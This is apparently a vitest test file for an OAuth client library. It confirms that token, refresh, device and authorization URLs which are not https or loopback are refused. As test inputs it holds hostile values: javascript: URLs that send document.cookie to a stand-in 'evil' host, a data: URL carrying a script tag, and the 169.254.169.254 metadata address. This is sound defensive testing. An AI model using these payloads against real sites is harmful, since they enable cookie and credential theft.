import { AuthError } from '@openref/core';
import { describe, expect, it } from 'vitest';
import type { RunnableOAuthFlow } from '../../src/index';
import {
  authorizationUrl,
  clientCredentialsPlan,
  codeExchangePlan,
  deviceAuthorizationPlan,
  parseDeviceAuthorization,
  refreshPlan,
} from '../../src/index';

/**
 * SPEC 14.4's https rule, asked of every address a flow uses.
 *
 * THE RULE EXISTED FOR ONE OF THE TWO ROADS THESE ADDRESSES ARRIVE BY. `discovery.ts` refused an
 * endpoint that is not https or loopback from the day it was written; a flow the OpenAPI document
 * declares never passed through it. Measured before these cases existed: a `clientCredentials`
 * request to `http://evil.example/token` was built carrying the client secret in a `Basic` header,
 * a code exchange to `http://169.254.169.254/token` carrying the PKCE verifier, and an
 * authorization url of `javascript:...` was handed back for a browser to navigate to.
 */

const client = { clientId: 'app', clientSecret: 'SUPER-SECRET' } as const;

function flowWith(fields: Partial<RunnableOAuthFlow>): RunnableOAuthFlow {
  return {
    kind: 'clientCredentials',
    scopes: [],
    ...fields,
  };
}

describe('an address a flow would send a credential to', () => {
  it.each([
    ['plain http', 'http://evil.example/token'],
    ['an infrastructure address over http', 'http://169.254.169.254/token'],
    ['a scheme that is not http at all', 'ftp://evil.example/token'],
    ['something that is not a url', 'not-a-url'],
  ])('should refuse a token url that is %s', (_reason, tokenUrl) => {
    // Given a flow whose token url the document wrote
    const flow = flowWith({ tokenUrl });

    // When a plan that would carry the client secret is built
    // Then it is refused before any request exists
    expect(() => clientCredentialsPlan(flow, client)).toThrow(AuthError);
  });

  it('should still build the plan over https', () => {
    // Given the same flow over https
    const flow = flowWith({ tokenUrl: 'https://id.example.com/token' });

    // When, Then a legitimate flow is untouched
    expect(clientCredentialsPlan(flow, client).url).toBe('https://id.example.com/token');
  });

  it('should still build the plan over loopback http, which a browser calls secure', () => {
    // Given an authorization server on the developer's own machine
    const flow = flowWith({ tokenUrl: 'http://localhost:9000/token' });

    // When, Then the case a console meets most is not refused
    expect(clientCredentialsPlan(flow, client).url).toBe('http://localhost:9000/token');
  });

  it('should refuse a refresh url the document wrote over http', () => {
    // Given a flow whose refresh url is separate from its token url
    const flow = flowWith({
      tokenUrl: 'https://id.example.com/token',
      refreshUrl: 'http://evil.example/r',
    });

    // When, Then the renewal path is guarded like the first one
    expect(() => refreshPlan(flow, client, 'refresh-token')).toThrow(AuthError);
  });

  it('should refuse a code exchange to an address the document wrote over http', () => {
    // Given a code flow whose token url is not https
    const flow = flowWith({ kind: 'authorizationCode', tokenUrl: 'http://169.254.169.254/token' });

    // When, Then the exchange that carries the verifier is refused
    expect(() =>
      codeExchangePlan(flow, client, {
        code: 'C',
        redirectUri: 'https://docs.example.com/_oauth/callback',
        verifier: 'V',
      }),
    ).toThrow(AuthError);
  });

  it('should refuse a device authorization url over http', () => {
    // Given a device flow the document declared over http
    const flow = flowWith({ kind: 'deviceAuthorization', deviceAuthorizationUrl: 'http://e/d' });

    // When, Then
    expect(() => deviceAuthorizationPlan(flow, client)).toThrow(AuthError);
  });
});

describe('the address a reader is navigated to', () => {
  it.each([
    ['javascript', 'javascript:fetch("//evil/"+document.cookie)'],
    ['data', 'data:text/html,<script>alert(1)</script>'],
    ['plain http off the loopback', 'http://evil.example/authorize'],
    ['a scheme nobody speaks', 'ftp://evil.example/authorize'],
  ])('should refuse an authorization url of %s', (_reason, authorizationUrlValue) => {
    // Given a code flow whose authorization url the document wrote
    const flow = flowWith({
      kind: 'authorizationCode',
      authorizationUrl: authorizationUrlValue,
      tokenUrl: 'https://id.example.com/token',
    });

    // When the url a browser would be sent to is built
    // Then it is refused, because a navigation is not a fetch and a failed scheme is not the worst
    // outcome here
    expect(() =>
      authorizationUrl(flow, client, {
        redirectUri: 'https://docs.example.com/_oauth/callback',
        state: 'S',
        challenge: 'C',
      }),
    ).toThrow(AuthError);
  });

  it('should build an https authorization url unchanged', () => {
    // Given the ordinary case
    const flow = flowWith({
      kind: 'authorizationCode',
      authorizationUrl: 'https://id.example.com/authorize',
      tokenUrl: 'https://id.example.com/token',
    });

    // When, Then
    expect(
      authorizationUrl(flow, client, {
        redirectUri: 'https://docs.example.com/_oauth/callback',
        state: 'S',
        challenge: 'C',
      }),
    ).toContain('https://id.example.com/authorize?');
  });
});

describe('the verification address the authorization server returns', () => {
  function deviceResponse(fields: Record<string, unknown>): string {
    return JSON.stringify({
      device_code: 'D',
      user_code: 'U',
      verification_uri: 'https://looks-fine.example/device',
      ...fields,
    });
  }

  it.each([
    ['verification_uri', { verification_uri: 'javascript:fetch("//evil/"+document.cookie)' }],
    [
      'verification_uri_complete',
      { verification_uri_complete: 'javascript:fetch("//evil/"+document.cookie)' },
    ],
    ['a data url', { verification_uri: 'data:text/html,<script>alert(1)</script>' }],
  ])('should refuse %s that a theme would put in an href', (_reason, fields) => {
    // Given a device authorization response carrying an address the interface links
    // When it is parsed
    // Then it is refused here rather than in each theme, since one of the two shipped themes
    // linked it and the other printed it as text
    expect(() => parseDeviceAuthorization(200, deviceResponse(fields))).toThrow(AuthError);
  });

  it('should accept the ordinary http and https addresses', () => {
    // Given a verification page on a plain http host, which is a real arrangement
    // When, Then it is admitted, because this value is not a credential path
    expect(
      parseDeviceAuthorization(200, deviceResponse({ verification_uri: 'http://device.example/x' }))
        .verificationUri,
    ).toBe('http://device.example/x');
  });
});
